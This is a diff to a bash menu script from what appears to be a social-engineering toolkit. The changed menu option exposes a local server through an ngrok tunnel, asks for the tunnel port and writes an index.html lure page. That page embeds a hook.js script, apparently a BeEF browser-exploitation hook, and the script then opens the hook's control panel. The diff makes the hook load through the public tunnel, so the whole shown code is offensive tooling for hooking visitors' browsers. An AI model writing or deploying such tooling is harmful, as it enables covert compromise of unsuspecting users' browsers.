@@ -240,7 +240,10 @@ elif [[ $menu = 5 ]]; then
             clear
             ngrokip=$(resolveip -s ngrok.com)
             cd tools/
-            xterm -e ./ngrok tcp 3000 &
+            xterm -e ./ngrok http 3000 &
+            sleep 2
+            echo "Please enter that Port that ngrok gives you [0.tcp.ngrok.io:xxxx]  "
+            read ngrokport
             sleep 2
             bash serveo.sh &
             sleep 2
@@ -258,7 +261,7 @@ elif [[ $menu = 5 ]]; then
             echo "<html>" >> index.html
             echo "<title> $title </title>" >> index.html
             echo "<body>" >> index.html
-            echo "<script src='http://127.0.0.1:3000/hook.js'></script>" >> index.html
+            echo "<script src='hook.js'></script>" >> index.html
             echo "$body" >> index.html
             echo "</body>" >> index.html
             echo "</html>" >> index.html
@@ -270,7 +273,7 @@ elif [[ $menu = 5 ]]; then
             echo ""
             xterm -geometry 0x0 -e firefox http://127.0.0.1:3000/ui/panel &
             read -p "Press [ENTER] to stop"
-            killall ruby xterm ssh
+            killall ruby xterm
             service apache2 stop
             cd ~/set2/
             ./set2.sh   
